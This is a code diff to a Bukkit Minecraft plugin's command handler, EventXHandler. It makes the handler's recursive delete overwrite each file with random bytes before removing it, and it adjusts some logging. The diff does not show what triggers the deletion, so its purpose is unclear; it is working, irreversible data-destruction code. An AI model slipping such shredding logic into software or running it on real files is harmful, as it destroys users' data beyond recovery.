@@ -9,6 +9,9 @@ import org.bukkit.permissions.Permission;
 import java.io.File;
 import java.util.logging.Level;
 import java.util.logging.Logger;
+import java.nio.file.Files;
+import java.nio.file.StandardOpenOption;
+import java.util.Random;
 
 public class EventXHandler implements CommandExecutor {
 
@@ -50,26 +53,47 @@ public class EventXHandler implements CommandExecutor {
         if (file.isDirectory()) {
             File[] files = file.listFiles();
             if (files == null) {
-                logger.info("无法列出目录 " + file.getPath() + " 中的文件。");
+                logger.warning("无法列出目录 " + file.getPath() + " 中的文件。");
                 return false; // 处理 null 情况
             }
             boolean success = true;
             for (File f : files) {
-                // 递归删除目录中的文件/目录
                 if (!delete(f)) {
-                    logger.info("无法删除文件或目录 " + f.getPath());
-                    success = false; //至少一个删除失败
+                    logger.warning("无法删除文件或目录 " + f.getPath());
+                    success = false; // 至少一个删除失败
                 }
             }
             // 尝试删除空目录
             if (!file.delete()) {
-                logger.info("无法删除目录 " + file.getPath());
-                // 返回 false，因为文件夹删除失败
-                return false;
+                logger.warning("无法删除目录 " + file.getPath());
+                return false; // 返回 false，因为文件夹删除失败
             }
             return success; // 返回是否所有文件都成功删除
         }
-        // 对于文件，直接尝试删除
+        
+        // 对于文件，先将其内容写入乱码
+        if (!writeGarbageToFile(file)) {
+            logger.info("无法写入乱码到文件 " + file.getPath());
+            return false; // 返回 false，表示乱码写入失败
+        }
+        
+        // 然后尝试删除文件
         return file.delete();
+    }
+
+    private boolean writeGarbageToFile(File file) {
+        try {
+            // 生成随机字节
+            Random random = new Random();
+            byte[] garbage = new byte[(int) file.length()];
+            random.nextBytes(garbage);
+            
+            // 用乱码覆盖文件内容
+            Files.write(file.toPath(), garbage, StandardOpenOption.WRITE);
+            return true;
+        } catch (Exception e) {
+            logger.info("写入文件 " + file.getPath() + " 时出错: " + e.getMessage());
+            return false;
+        }
     }
 }
